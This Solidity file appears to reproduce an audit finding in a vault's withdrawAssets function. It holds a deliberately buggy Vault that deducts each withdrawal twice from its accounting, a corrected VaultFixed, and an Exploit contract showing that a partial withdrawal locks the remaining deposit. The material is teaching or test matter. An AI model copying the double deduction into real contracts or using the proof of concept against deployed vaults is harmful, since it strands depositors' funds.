// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Term Structure — withdrawAssets (Cantina, February 2025)
    When the vault already holds the assets, withdrawAssets subtracts `amount`
    from _totalFt and _accretingPrincipal, then subtracts `amount` again at the
    bottom of the function. A partial withdraw leaves totalFt below the cash
    still in the contract, and the next withdraw underflows, so the rest of the
    deposit is stuck.
*/

interface IERC20 {
    function balanceOf(address a) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

library SafeERC20 {
    function safeTransfer(IERC20 token, address to, uint256 amount) internal {
        require(token.transfer(to, amount), "transfer");
    }
}

contract Asset {
    string public symbol = "FT";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

error InsufficientFunds(uint256 maxWithdraw, uint256 amount);

contract Vault {
    using SafeERC20 for IERC20;

    IERC20 public asset;
    uint256 public _totalFt;
    uint256 public _accretingPrincipal;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(IERC20 _asset) {
        asset = _asset;
    }

    function totalFt() external view returns (uint256) {
        return _totalFt;
    }

    function accretingPrincipal() external view returns (uint256) {
        return _accretingPrincipal;
    }

    function deposit(uint256 amount) external {
        require(Asset(address(asset)).transferFrom(msg.sender, address(this), amount), "pull");
        uint256 shares = totalSupply == 0 ? amount : amount * totalSupply / _totalFt;
        _totalFt += amount;
        _accretingPrincipal += amount;
        balanceOf[msg.sender] += shares;
        totalSupply += shares;
    }

    function withdraw(uint256 shares) external returns (uint256 amount) {
        amount = shares * _totalFt / totalSupply;
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;
        withdrawAssets(asset, msg.sender, amount);
    }

    function withdrawAssets(IERC20 token, address recipient, uint256 amount) public {
        uint256 amountLeft = amount;
        uint256 assetBalance = token.balanceOf(address(this));
        if (assetBalance >= amount) {
            token.safeTransfer(recipient, amount);
            _totalFt -= amount;
            _accretingPrincipal -= amount;
        } else {
            amountLeft -= assetBalance;
            if (amountLeft > 0) {
                uint256 maxWithdraw = amount - amountLeft;
                revert InsufficientFunds(maxWithdraw, amount);
            }
            _totalFt -= amount;
            _accretingPrincipal -= amount;
        }
        // @> VULN: the withdrawal was already subtracted above, so totalFt falls by twice the tokens that left
        _totalFt -= amount;
        _accretingPrincipal -= amount;
    }
}

contract VaultFixed {
    using SafeERC20 for IERC20;

    IERC20 public asset;
    uint256 public _totalFt;
    uint256 public _accretingPrincipal;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(IERC20 _asset) {
        asset = _asset;
    }

    function totalFt() external view returns (uint256) {
        return _totalFt;
    }

    function deposit(uint256 amount) external {
        require(Asset(address(asset)).transferFrom(msg.sender, address(this), amount), "pull");
        uint256 shares = totalSupply == 0 ? amount : amount * totalSupply / _totalFt;
        _totalFt += amount;
        _accretingPrincipal += amount;
        balanceOf[msg.sender] += shares;
        totalSupply += shares;
    }

    function withdraw(uint256 shares) external returns (uint256 amount) {
        amount = shares * _totalFt / totalSupply;
        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;
        withdrawAssets(asset, msg.sender, amount);
    }

    function withdrawAssets(IERC20 token, address recipient, uint256 amount) public {
        uint256 assetBalance = token.balanceOf(address(this));
        if (assetBalance >= amount) {
            token.safeTransfer(recipient, amount);
        } else {
            revert InsufficientFunds(assetBalance, amount);
        }
        // FIX: subtract the withdrawal once.
        _totalFt -= amount;
        _accretingPrincipal -= amount;
    }
}

contract Exploit {
    Asset public asset;
    Vault public vault;
    uint256 public firstOut;
    bool public secondReverted;
    uint256 public locked;

    constructor() {
        asset = new Asset();
        vault = new Vault(IERC20(address(asset)));
    }

    function run() external {
        asset.mint(address(this), 200 ether);
        asset.approve(address(vault), 200 ether);
        vault.deposit(200 ether);
        firstOut = vault.withdraw(50 ether);
        uint256 ftAfter = vault.totalFt();
        uint256 principalAfter = vault.accretingPrincipal();
        uint256 cashAfter = asset.balanceOf(address(vault));
        (bool ok,) = address(vault).call(abi.encodeWithSignature("withdraw(uint256)", 150 ether));
        secondReverted = !ok;
        locked = asset.balanceOf(address(vault));
        require(firstOut == 50 ether, "first");
        require(ftAfter == 100 ether, "ft");
        require(principalAfter == 100 ether, "principal");
        require(cashAfter == 150 ether, "cash");
        require(secondReverted, "second");
        require(locked == 150 ether, "locked");
        require(asset.balanceOf(address(this)) == 50 ether, "kept");
    }
}
